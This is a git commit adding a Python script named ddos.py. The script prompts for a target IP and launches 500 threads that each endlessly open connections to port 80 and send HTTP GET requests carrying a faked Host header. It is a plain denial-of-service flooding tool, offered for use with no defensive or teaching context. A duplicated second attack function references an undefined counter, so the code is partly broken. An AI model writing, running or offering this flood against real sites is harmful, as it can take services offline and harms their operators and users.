54f1d7d8f6f479149786fe43dc336b89e5e61e7a
TIOX-88 <109265909+TIOX-88@users.noreply.github.com>
2022-09-16 18:34:41 +0600

    Add files via upload

---
+++ ddos.py
@@ -0,0 +1,33 @@
+import socket
+import threading
+
+target = input('web ip :')
+fake_ip = '182.21.20.32'
+port = 80
+
+print(target)
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
